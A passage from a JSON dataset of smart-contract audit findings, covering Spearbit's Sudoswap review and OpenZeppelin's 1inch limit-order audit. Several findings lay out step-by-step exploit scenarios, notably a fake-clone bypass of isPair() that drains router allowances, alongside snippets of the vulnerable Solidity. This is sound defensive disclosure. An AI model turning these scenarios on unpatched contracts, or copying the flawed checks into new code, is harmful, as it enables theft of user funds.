      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- **File**: LSSVMPair.sol\n- **Lines**: 371-379, 318-366\n\n## Description\nA malicious router could be whitelisted by an inattentive or a malicious factory owner and drain pair funds in the following exploit scenario:\n\n1. Call the cache function. Suppose that the current balance is 10, so it gets cached.\n2. Sell 5 NFTs to the pair and get paid using `swapNFTsForToken`. Total balance is now 15 but the cached balance is still 10.\n3. Call `routerSwapNFTsForToken`. This function will compute `total_balance - cached_balance`, assume 5 NFTs have been sent to it and pay the user. However, no new NFTs have been sent and it already paid for them in Step 2.\n\n## Recommendation\nSpearbit recommends Sudoswap to implement reentrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). We also suggest implementing recommendations in the \"Simplify the Connection between Pair and Router\" found in the \"Gas Optimization\" section of this report to reduce attack surface.\n\n## Status\n- **Sudoswap**: Removed this flow through the implementation of the recommendation here.\n- **Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about the risk of a malicious router being whitelisted by an inattentive or malicious factory owner and draining pair funds. The exploit scenario involves a malicious router calling the cache function and then selling 5 NFTs to the pair and getting paid using swapNFTsForToken. This causes the total balance to increase but the cached balance remains the same. The malicious router then calls routerSwapNFTsForToken and gets paid for the NFTs even though they were already paid for in the previous step. \n\nTo mitigate this risk, Spearbit recommends that Sudoswap implement reentrancy modifiers and simplify the connection between the pair and the router to reduce attack surface. Sudoswap has implemented the recommendation and Spearbit has acknowledged it.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6776",
      "title": "Malicious assetRecipient could get an unfair amount of tokens",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`LSSVMRouter.sol#L754-789`\n\n## Description\nThe function `_swapNFTsForToken()` of `LSSVMRouter` calls `safeTransferFrom()`, which then calls `ERC721Received` of `assetRecipient`. A malicious `assetRecipient` could manipulate its NFT balance by buying additional NFTs via the Pair and sending or selling them back to the Pair, enabling the malicious actor to obtain an unfair amount of tokens via `routerSwapNFTsForToken()`.\n\n```solidity\nfunction _swapNFTsForToken(...) {\n    ...\n    swapList[i].pair.cacheAssetRecipientNFTBalance();\n    ...\n    for (uint256 j = 0; j < swapList[i].nftIds.length; j++) {\n        nft.safeTransferFrom(msg.sender, assetRecipient, swapList[i].nftIds[j]); // call to onERC721Received of assetRecipient\n    }\n    ...\n    outputAmount += swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); // checks the token balance of assetRecipient\n    ...\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to implement re-entrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). We also recommend that Sudoswap implements the recommendation \"Simplify the Connection Between Pair and Router\" in the \"Gas Optimizations\" section of this report to reduce the attack surface. Finally, we recommend that Sudoswap make sure the `assetRecipient` is trusted.\n\n**Sudoswap:** We’ve also accepted the recommendation to simplify the connection between the Router and the Pair, provided fix is in the issue here.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report describes a potential attack vector on the LSSVMRouter.sol#L754-789 function _swapNFTsForToken(). The malicious actor could manipulate the NFT balance by buying additional NFTs, sending or selling them back to the Pair and obtaining an unfair amount of tokens via routerSwapNFTsForToken(). To prevent this, Spearbit recommends that Sudoswap implements re-entrancy modifiers, simplifies the connection between the Pair and Router and makes sure the assetRecipient is trusted. Sudoswap has accepted the recommendation to simplify the connection between the Router and the Pair.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6775",
      "title": "Missing check in the number of Received Tokens when tokens are transferred directly",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- **Location**: `LSSVM\\contracts`, `LSSVMPairERC20.sol#L41-78`\n\n## Description\nWithin the function `_validateTokenInput()` of `LSSVMPairERC20`, two methods exist to transfer tokens. In the first method, via `router.pairTransferERC20From()`, a check is performed on the number of received tokens. In the second method, no checks are done.\n\nRecent hacks (e.g., Qubit finance) have successfully exploited `safeTransferFrom()` functions which did not revert nor transfer tokens. Additionally, with malicious or re-balancing tokens, the number of transferred tokens might be different from the amount requested to be transferred.\n\n```solidity\nfunction _validateTokenInput(...) ... {\n    ...\n    if (isRouter) {\n        // Call router to transfer tokens from user\n        uint256 beforeBalance = _token.balanceOf(_assetRecipient);\n        router.pairTransferERC20From(...)\n        // Verify token transfer (protect pair against malicious router)\n        require(_token.balanceOf(_assetRecipient) - beforeBalance == inputAmount, \"ERC20 not transferred in\");\n    } else {\n        // Transfer tokens directly\n        _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount);\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to verify the number of tokens received when these are transferred directly.\n\n## Comments\n- **Sudoswap**: Risks acknowledged but no changes at this time. Pair creators would have to willingly deploy an NFT/Token pair for a token using non-standard ERC20 token behavior to be at risk.\n- **Spearbit**: Acknowledged.",
      "summary": "\nA bug report has been found in the LSSVM\\contracts,LSSVMPairERC20.sol#L41-78 code. It is a medium risk bug and is related to the function _validateTokenInput(). This function has two methods to transfer tokens, one with a check on the number of received tokens and the other without a check. This could be exploited by malicious or rebalancing tokens, as seen in the Qubit Finance hack. Spearbit recommends Sudoswap to verify the number of tokens received when these are transferred directly. Sudoswap has acknowledged the risk but no changes are planned at this time. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6774",
      "title": "Factory Owner can steal user funds approved to the Router",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- **Files:** LSSVMPair.sol#L687-695, LSSVMRouter.sol#L574\n\n## Description\nA pair owner can make arbitrary calls to any contract that has been approved by the factory owner. The code in the factory intends to prevent router contracts from being approved for calls because router contracts can have access to user funds. An example includes the `pairTransferERC20From()` function, which can be used to steal funds from any account that has given it approval.\n\nThe router contracts can nevertheless be whitelisted by first being removed as a router and then being whitelisted. This way, anyone can deploy a pair and use the `call` function to steal user funds.\n\n## Recommendation\nSpearbit recommends that Sudoswap consider changing the architecture such that the router simply sends the NFTs to the pair when it calls the swap function. If you want to remove the trust from the router, make the pair store reserve balances and check tokens received against it.\n\n## Sudoswap\nThe immediate issue of adding/removing routers is addressed in this branch here. Every time a new router is added or removed, we only toggle the allowed flag, while `wasEverAllowed` is always true. `LSSVMPair.call()` now checks if we’ve ever approved a router. The broader issue of the factory owner being able to potentially steal pool funds is acknowledged, with other specific vectors mentioned in the audit addressed in other branches.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines a vulnerability in the LSSVMPair and LSSVMRouter contracts. The code in the factory intends to prevent router contracts from being approved for calls, as they can have access to user funds. However, a pair owner can still make arbitrary calls to any contract that has been approved by the factory owner, allowing them to potentially steal user funds. \n\nSudoswap has addressed the immediate issue of adding/removing routers, however, the broader issue of the factory owner being able to potentially steal pool funds remains. Spearbit recommends that Sudoswap consider changing the architecture such that the router sends the NFTs to the pair when it calls the swap function, and that the pair should store reserve balances and check tokens received against it. Spearbit's recommendation has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6773",
      "title": "Clones with malicious extradata are also considered valid clones",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n- **LSSVMPairCloner.sol:** lines 121 \n- **LSSVMPair.sol:** lines 687-695 \n- **LSSVMRoute.sol:** lines 574-594 \n- **LSSVMPairFactory.sol:** lines 223-257 \n- **LSSVMPairCloner.sol:** lines 206\n\n## Description\nSpearbit discovered that the functions verifying if a contract is a pair do so by only checking the first 54 bytes (i.e., the Proxy code). An attacker could deploy a contract that starts with the first 54 bytes of proxy code but have a malicious payload, and these functions will still verify it as a legitimate clone. We have found this to be a critical issue based on the feasibility of a potential exploit.\n\n### Consider the following scenario:\n1. An attacker creates a malicious pair by making a copy of the source of `cloneETHPair()`, supplying malicious values for `factory`, `bondingCurve`, `nft`, and `poolType` using a valid template for the connected contract.\n2. The attacker has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid.\n3. The Pair is initialized via a copy of `initialize()` of `LSSVMPair`, which calls `__Ownable_init()` to set a malicious owner.\n4. The malicious owner calls `call()`, with target equal to the router contract and the calldata for the function `pairTransferERC20From()`:\n   ```solidity\n   // Owner is set by pair creator\n   function call(address payable target, bytes calldata data) external onlyOwner { \n       // Factory is malicious\n       LSSVMPairFactoryLike _factory = factory();\n       ///grave.ts1callAllowed() /grave.ts1is malicious and returns true\n       require(_factory.callAllowed(target), \"Target must be whitelisted\");\n       (bool result, ) = target.call{value: 0}(data);\n       require(result, \"Call failed\");\n   }\n   ```\n5. The check for `onlyOwner` and `require` pass, therefore `pairTransferERC20From()` is called with the malicious Pair as `msg.sender`.\n6. The router checks if it is called from a valid pair via `isPair()`:\n   ```solidity\n   function pairTransferERC20From(...) external {\n       // Verify caller is a trusted pair contract\n       // The malicious pair passed this test\n       require(factory.isPair(msg.sender, variant), \"Not pair\");\n       ...\n       token.safeTransferFrom(from, to, amount);\n   }\n   ```\n7. Because the function `isPair()` only checks the first 54 bytes (the runtime code including the implementation address), `isPair()` does not check for extra parameters `factory`, `bondingCurve`, `nft`, or `poolType`:\n   ```solidity\n   function isPair(address potentialPair, PairVariant variant) ... {\n       ...\n   } else if (variant == PairVariant.ENUMERABLE_ETH) {\n       return LSSVMPairCloner.isETHPairClone(address(enumerableETHTemplate), potentialPair);\n   }\n   ...\n   function isETHPairClone(address implementation, address query) ... {\n       ...\n       // Compare expected bytecode with that of the queried contract\n       let other := add(ptr, 0x40)\n       extcodecopy(query, other, 0, 0x36)\n       result := and(\n           eq(mload(ptr), mload(other)),\n           // Checks 32 + 22 = 54 bytes\n           eq(mload(add(ptr, 0x16)), mload(add(other, 0x16)))\n       )\n   }\n   ```\n8. Now the malicious pair is considered valid, the require statement in `pairTransferERC20From()` has passed, and tokens can be transferred to the attacker from anyone who has set an allowance for the router.\n\n## Recommendation\nSpearbit recommends Sudoswap to verify more values when checking if a pair is valid—especially the factory value. We also recommend considering the removal of all trust between pairs and routers, as well as the function `call()`.\n\n### Sudoswap\nAdded factory check to `isPair` functions here.\n\n### Spearbit\nAcknowledged. Please double-check with the changes for the finding \"Saving 1 byte Off The Constructor() Code\"—especially the amount of bytes checked at the end of `isETHPairClone()` and `isERC20PairClone()`.",
      "summary": "\nThis bug report describes a critical security risk in the LSSVMPairCloner.sol, LSSVMPair.sol, LSSVMRouter.sol, LSSVMPairFactory.sol and LSSVMPairCloner.sol contracts. The issue is that these contracts only check the first 54 bytes (i.e. the Proxy code) when verifying if a contract is a pair. This means that an attacker could deploy a contract that starts with the first 54 bytes of proxy code but have a malicious payload and these functions will still verify it as a legitimate clone. \n\nThis could be exploited in the following way: an attacker creates a malicious pair by making a copy of the source of cloneETHPair() supplying malicious values for factory, bondingCurve, nft and poolType using a valid template for the connected contract. The attacker then has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid. This malicious owner then calls call() with target equal to the router contract and the calldata for the function pairTransferERC20From(). The check for onlyOwner and require pass, therefore pairTransferERC20From() is called with the malicious Pair as msg.sender. Because the function isPair() only checks the first 54 bytes, it does not check for extra parameters factory, bondingCurve, nft or poolType, and so the malicious pair is considered valid. The require statement in pairTransferERC20From() has passed and tokens can be transferred to the attacker from anyone who has set an allowance for the router. \n\nSpearbit recommends Sudoswap to verify more values when checking if a pair is valid - especially the factory value. They also recommend to consider the removal of all trust between pairs and routers, as well as the function call(). Sudoswap has added a factory check to the isPair functions, and Spearbit has acknowledged this. They also recommend to double-check with the changes for the finding “Saving 1 byte Off The Constructor() Code” - especially the amount of bytes checked at the end of isETHPairClone() and isERC20PairClone().",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "10697",
      "title": "[L14] Using deprecated Chainlink calls",
      "impact": "LOW",
      "content": "The [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract is intended to be used to query Chainlink oracles. It does so via making calls to their [`latestTimestamp`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L23) and [`latestAnswer`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L27) methods, [both of which have been deprecated](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.6/FluxAggregator.sol#L335-L361). In fact, the methods are no longer present in the API of Chainlink aggregators [as of version three](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol).\n\n\nTo avoid potential future incompatibilities with Chainlink oracles, consider using the [`latestRoundData`](https://github.com/smartcontractkit/chainlink/blob/1adaebc7acedb3a133611ec5cbb61a852802ad33/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol#L43) method instead.\n\n\n***Update:** Fixed in [pull request #67](https://github.com/1inch/limit-order-protocol/pull/67).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10696",
      "title": "[L13] Contradictory order handling when lacking parameters",
      "impact": "LOW",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`fillOrderTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L190) function makes internal calls to the [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) and [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) functions whenever a fill is attempted and either the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) or the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L229) parameters are zero, respectively, or if the [`makingAmount` value is larger than the `remainingMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value.\n\n\nThe `_callGetMakerAmount` and `_callGetTakerAmount` calls will lead to reversions if the order was not created with the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L316) or [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L327) parameters, respectively, and a partial fill is being executed.\n\n\nAn [inline comment alongside `_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L328) and an [inline comment alongside `_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L317) claim that “only whole fills are allowed” if the order was not created with `getMakerAmount` or `getTakerAmount` parameters.\n\n\nHowever, there are code paths for which this does not apply, because those paths do not check the `length`s of both `getMakerAmount` and `getTakerAmount` parameters.\n\n\nSpecifically, [when a `taker` specifies a `takerAmount` value for an order which only has a `getMakerAmount`, unless that call to `getMakerAmount` returns an amount larger than `remainingMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232-L234), a partial fill can be executed in contradiction to the inline documentation.\n\n\nThis leaves the intentionality of those code paths unclear. If this is the expected behavior, consider modifying the inline documentation so that it is more explicit. If this is unintentional behavior, consider always checking the lengths of both the `getMakerAmount` and the `getTakerAmount` parameters simultaneously so that the implementation reinforces the behavior described by the inline documentation.\n\n\n***Update:** Fixed in [pull request #79](https://github.com/1inch/limit-order-protocol/pull/79).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10695",
      "title": "[L12] Rounding can be unfavorable for taker",
      "impact": "LOW",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) and [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contracts, when an order is being filled and the taker provides only a `makingAmount` or `takingAmount` amount, the protocol attempts to calculate the counterpart amount of the swap.\n\n\nThere are two issues with these calculations, the first being that there is no documentation or logic limiting the number of decimals that the amount parameters should use, which we addressed in the ***Undocumented decimal assumptions*** issue.  \n\nThe second issue is that, in the course of these calculations, the protocol rounds in the favor of the maker. The rounding issue can be greatly exacerbated when the implicit decimal assumptions are broken, but even when everything is in the expected terms, rounding will occur with small, odd amounts.\n\n\nConsider allowing the taker to specify a minimum amount of `makerAsset` asset that they are willing to receive together with a maximum amount of `takerAsset` asset they are willing to swap, so that the acceptance of any rounding is more explicit.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> Threshold amount should be enough for taker’s protection.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10694",
      "title": "[L11] DoS orders possible when using hooks",
      "impact": "LOW",
      "content": "The [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract implements functionality to fill generic off-chain swap orders which could have conditions for their success. During order fills, the order can [check the predefined “predicate” conditions](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L218) before continuing with execution.\n\n\nHowever, because these predicate conditions could target the logic of any arbitrary contract, a malicious maker could trick takers into believing that an order behaves correctly and that it is valid when checking it off-chain, but then failing when attempting to fill the same order on-chain. This change in the predicate behavior could either be made by frontrunning some variable state on which the predicates depend, by examining the gas sent or even which addresses are involved in the call, or by some other logic.\n\n\nFurthermore, if the maker defined a [interaction during the swap](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L264), the `interactionTarget` contract could revert itself or revoke the allowance to prevent a successful order fill, essentially leading to the same result as malicious predicates.\n\n\nAlthough assets will not be at risk, users or bots finding a favorable order will have the increased burden of trying to identify these sorts of spam orders that can seem legitimate on the surface. In the case that they fail to identify these sorts of orders they will incur wasted gas costs. To reduce the amount of spam orders, consider restricting the available targets for these hooks. Also consider warning users about this possibility before they attempt to fill orders.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> We handle that on our backend and we’ll think about the ways to notify possible takers about the issue.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10693",
      "title": "[L10] Misleading or incomplete inline documentation",
      "impact": "LOW",
      "content": "Throughout the codebase, a few instances of misleading and/or incomplete inline documentation were identified and should be fixed.\n\n\nThe following are instances of misleading inline documentation:\n\n\n* In the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract, the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) function’s [NatSpec `@notice` tag](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L14) says that it `Calculates price of token relative to ETH scaled by 1e18`, but in fact, its result is the *value* of `amount` tokens scaled by `1e18`, where the oracle may not report in terms of ETH (for a pair not including ETH, for instance).\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, the `invalidatorForOrderRFQ` function’s [NatSpec `@return` tag](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L38) is misleading, because the quote may not have been filled for the respective invalidator bit to have been set. The order can also have been canceled.\n* On lines [147](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L147), [165](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L165), and [188](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L188) of [`OrderMixin.sol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol), the NatSpec `@param` tags are ungrammatical.\n* On line [20](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol#L20) of [`ERC1155Proxy.sol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol), the `@notice` tag states that the computed hash is the result of hashing the `func_733NCGU` function, where it should be the `func_301JL5R` function instead.\n\n\nThe following are instances of incomplete inline documentation:\n\n\n* Functions in the [`AmountCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol) contract do not describe any of the parameters.\n* In the `ChainlinkCalculator` contract, the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) and [`doublePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L35) functions do not describe all of the parameters.\n* In the [`ImmutableOwner`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ImmutableOwner.sol) contract, the public variable and modifier have no NatSpec.\n* In the [`InteractiveNotificationReceiver`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/interfaces/InteractiveNotificationReceiver.sol) contract, the [`notifyFillOrder`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/interfaces/InteractiveNotificationReceiver.sol#L10) function does not describe any of the parameters.\n* In the [`LimitOrderProtocol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/LimitOrderProtocol.sol) contract, the `DOMAIN_SEPARATOR` function has no NatSpec.\n* Events and mappings in the [`NonceManager`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol) have no NatSpec.\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin) contract, `cancelOrderRFQ*` functions do not describe the return values.\n* In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, several functions lack complete NatSpec.\n* On line [168](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L168) of `OrderMixin.sol` and on line [71](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L71) of `OrderRFQMixin.sol`, it is missing the `@dev` tag.\n* Functions in the [`PredicateHelper`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol) contract do not describe all of the parameters.\n\n\nClear inline documentation is fundamental for outlining the intentions of the code. Mismatches between the inline documentation and the implementation can lead to serious misconceptions about how the system is expected to behave. Consider fixing these errors to avoid confusion for developers, users, and auditors alike.\n\n\n***Update:** Partially fixed. Misleading documentation addressed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75) and [pull request #77](https://github.com/1inch/limit-order-protocol/pull/77).*\n\n\n*The 1inch team states:*\n\n\n\n> We’ve fixed misleading docs. Completion of the docs will be done later.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10692",
      "title": "[L09] Low unit test coverage",
      "impact": "LOW",
      "content": "The unit test coverage for the entire project is around 75%, with some of the contracts having particularly low coverage.\n\n\nConsidering the importance of unit tests to validate code and prevent regressions when refactoring and developing new features, we encourage significantly increasing unit test coverage to at least 95%, and including edge cases that cover even unlikely situations.\n\n\n***Update:** Not fixed.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10691",
      "title": "[L08] Lack of input validation",
      "impact": "LOW",
      "content": "The [`fillOrderToWithPermit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L169) and [`fillOrderTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L190) functions of the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, as well as the [`fillOrderRFQToWithPermit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L72) and [`fillOrderRFQTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L90) functions of the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, do not validate the `target` address parameter.\n\n\nThis makes it possible for a user to inadvertently pass in the zero address and, as a result, lock up the assets they are meant to receive after filling an order.\n\n\nTo ensure that users do not 